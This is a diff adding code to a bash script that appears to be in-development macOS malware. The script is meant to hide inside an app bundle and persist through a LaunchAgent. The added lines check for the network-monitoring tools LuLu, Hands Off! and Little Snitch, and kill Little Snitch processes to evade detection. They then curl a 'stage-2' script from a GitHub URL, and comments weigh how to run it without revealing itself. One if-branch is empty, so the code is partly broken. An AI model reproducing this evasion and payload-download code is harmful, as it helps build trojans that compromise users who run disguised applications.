@@ -10,6 +10,7 @@
 #https://linuxconfig.org/how-to-use-arrays-in-bash-script
 #https://stackoverflow.com/questions/34823263/how-to-pass-a-variable-to-the-mv-command-to-rename-a-file-text-with-spaces-and-t#34823319
 #https://stackoverflow.com/questions/13210880/replace-one-substring-for-another-string-in-shell-script#13210909
+#https://ryanstutorials.net/bash-scripting-tutorial/bash-if-statements.php
 #
 #
 #Variables for the LaunchAgent (this system may be abolished in the future)
@@ -52,6 +53,35 @@ EXEPATH="${APPDIR}/Contents/MacOS/${EXENAME}"
 #This an important variable: where in the .app dir the/this/a script is:
 SCRIPTPATH=""
 
+#Duplication:
+#The last line of this script will be deleted and then replaced with the app's (original) executable, to
+#prevent the wrong application from opening when the script is run. That would not be good.
+
+#Stage 2:
+#
+#I need to have some kind of start confition, maybe a timer or a use ammount?
+#Network monitor check and download of Stage 2:
+#The first part of this, the if statement and the variables, check for network monitoring applications
+#The second part of this will download Stage 2 to the same directory as this script (change this)
+NMCLS=/Applications/Little\ Snitch\ Configuration.app
+NMCLU=/Applications/LuLu.app
+NMCHO="/Applications/Hands Off!.app"
+if [ -d "$NMCLU" ] || [ -d "$NMCHO" ]; then
+elif [ -d "$NMCLS" ]; then
+#I can't kill the Little Snitch Daemon, as that belongs to root, but I can kill the other LS processes.
+#I'll have to check if LS still shows the alert when only the daemon is still alive.
+#I should also 'port' this 'solution' to LuLu, Hands Off!, and the newest Little Snitch (if it's not the same).
+  killall "Little Snitch Agent"
+  killall "Little Snitch Configuration"
+  killall "Little Snitch Network Monitor"
+  curl https://raw.githubusercontent.com/The-SamminAter/lol-limewire/master/stage-2.sh > ./stage-2.sh
+else
+  curl https://raw.githubusercontent.com/The-SamminAter/lol-limewire/master/stage-2.sh > ./stage-2.sh
+fi
+#Running Stage 2:
+#I could use 'open', but that might reveal this. I could alternatively just run the script, but that would
+#prevent the executable from being run in solution one and two, as the lines for that will have been echo'd 
+#onto the end of the duplicate of this script.
 
 #LaunchAgent creation:
 #If this doesn't work, it can be transitiond to printf (w/ /n)
